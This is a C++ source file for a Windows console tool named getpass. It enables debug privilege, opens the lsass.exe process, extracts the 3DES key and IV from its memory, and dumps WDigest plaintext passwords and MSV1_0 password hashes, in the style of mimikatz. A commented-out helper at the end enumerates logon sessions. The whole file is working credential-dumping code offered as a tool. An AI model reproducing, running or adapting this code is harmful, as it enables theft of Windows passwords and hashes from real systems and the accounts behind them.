// getpass.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "getpass.h"

#pragma comment(linker, "/SUBSYSTEM:CONSOLE,5.2")

int wmain(int argc, LPCWSTR argv[])
{
	MESSAGE(L"[*] Enable debug privilege\r\n");
	RETN_IF(!EnableDebugPrivilege(), L"EnableDebugPrivilege", -1);
	MESSAGE(L"[*] Open process lsass.exe\r\n");
	DWORD  dwLsassProcId = 0;
	HANDLE hLsassProc = OpenProcessByName(L"lsass.exe", &dwLsassProcId);
	RETN_IF(hLsassProc == NULL, L"OpenProcessByName", -1);
	MESSAGE(L"Open lsass.exe successfully, PID=%d\r\n", dwLsassProcId);
	MESSAGE(L"[*] Dump 3deskey and iv\r\n");
	DWORD         cbIV = 8;
	BYTE          szIV[8] = { 0 };
	KIWI_HARD_KEY sz3DesKey = { 0 };
	FindH3DesKey(hLsassProc, &sz3DesKey, (LPBYTE)&szIV, &cbIV);

	MESSAGE(L"3DES Key => Size:%x, Key array: ", sz3DesKey.cbSecret);
	HexDump((LPBYTE)&sz3DesKey.data, sz3DesKey.cbSecret, FALSE);

	MESSAGE(L"3DES IV  => IV array: ");
	HexDump(szIV, cbIV, FALSE);
	MESSAGE(L"[*] Dump wdigest password entries\r\n");
	Wdigest_LogSessList_Dump(hLsassProc, (LPBYTE)&sz3DesKey.data, sz3DesKey.cbSecret, szIV, cbIV);
	MESSAGE(L"[*] Dump msv1_0 hash entries\r\n");
	Msv1_0_LogonSessList_Dump(hLsassProc, (LPBYTE)&sz3DesKey.data, sz3DesKey.cbSecret, szIV, cbIV);

	CloseHandle(hLsassProc);
	return 0;
}
/*
BOOL EnumLoginSessions() //此程序无必要列举session
{
PLUID lpLuid = NULL, lpTmpLuid = NULL;
PSECURITY_LOGON_SESSION_DATA lpLogonSessionData = NULL;
ULONG ulSize = 0;
if (NT_ERROR(LsaEnumerateLogonSessions(&ulSize, &lpLuid)))
return fwprintf(stderr, L"LsaEnumerateLogonSessions: [%d]\r\n", GetLastError());

if (ulSize > 0)
fwprintf(stdout, L"%-16s\t%-16s\t%-16s\t%-16s\r\n",
L"UserName", L"LogonDoman", L"AuthenticationPackage", L"LogonType"
);

TCHAR szUserName[20] = { 0 };
TCHAR szDomain[20] = { 0 };
TCHAR szDnsDomain[20] = { 0 };
TCHAR szEncryptedPassword[256] = { 0 };

lpTmpLuid = lpLuid;
for (ULONG i = 0; i < ulSize; i++, lpTmpLuid++)
{
if (NT_ERROR(LsaGetLogonSessionData(lpTmpLuid, &lpLogonSessionData)))
continue;
fwprintf(stdout, L"%-16s\t%-16s\t%-16s\t%-16d\r\n",
lpLogonSessionData->UserName.Buffer,
lpLogonSessionData->LogonDomain.Buffer,
lpLogonSessionData->AuthenticationPackage.Buffer,
lpLogonSessionData->LogonType
);

}
LsaFreeReturnBuffer(lpLogonSessionData);
LsaFreeReturnBuffer(lpLuid);
return TRUE;
}
*/
